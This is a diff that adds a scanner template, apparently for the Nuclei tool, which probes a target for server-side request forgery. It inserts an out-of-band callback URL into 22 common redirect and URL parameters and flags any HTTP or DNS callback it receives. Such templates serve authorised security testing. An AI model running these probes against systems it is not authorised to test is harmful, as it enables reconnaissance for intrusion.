@@ -1,0 +1,50 @@
+id: ssrf-common-params
+
+info:
+  name: SSRF via Common Parameters
+  author: wf-recon-toolkit
+  severity: high
+  description: Tests common URL/redirect parameters for SSRF using out-of-band detection
+  tags: ssrf,oob,oast
+  reference:
+    - https://portswigger.net/web-security/ssrf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url={{interactsh-url}}"
+      - "{{BaseURL}}?redirect={{interactsh-url}}"
+      - "{{BaseURL}}?callback={{interactsh-url}}"
+      - "{{BaseURL}}?next={{interactsh-url}}"
+      - "{{BaseURL}}?return={{interactsh-url}}"
+      - "{{BaseURL}}?returnUrl={{interactsh-url}}"
+      - "{{BaseURL}}?redirect_uri={{interactsh-url}}"
+      - "{{BaseURL}}?continue={{interactsh-url}}"
+      - "{{BaseURL}}?dest={{interactsh-url}}"
+      - "{{BaseURL}}?destination={{interactsh-url}}"
+      - "{{BaseURL}}?target={{interactsh-url}}"
+      - "{{BaseURL}}?uri={{interactsh-url}}"
+      - "{{BaseURL}}?path={{interactsh-url}}"
+      - "{{BaseURL}}?page={{interactsh-url}}"
+      - "{{BaseURL}}?feed={{interactsh-url}}"
+      - "{{BaseURL}}?host={{interactsh-url}}"
+      - "{{BaseURL}}?site={{interactsh-url}}"
+      - "{{BaseURL}}?html={{interactsh-url}}"
+      - "{{BaseURL}}?load={{interactsh-url}}"
+      - "{{BaseURL}}?fetch={{interactsh-url}}"
+      - "{{BaseURL}}?image_url={{interactsh-url}}"
+      - "{{BaseURL}}?proxy={{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '.*'
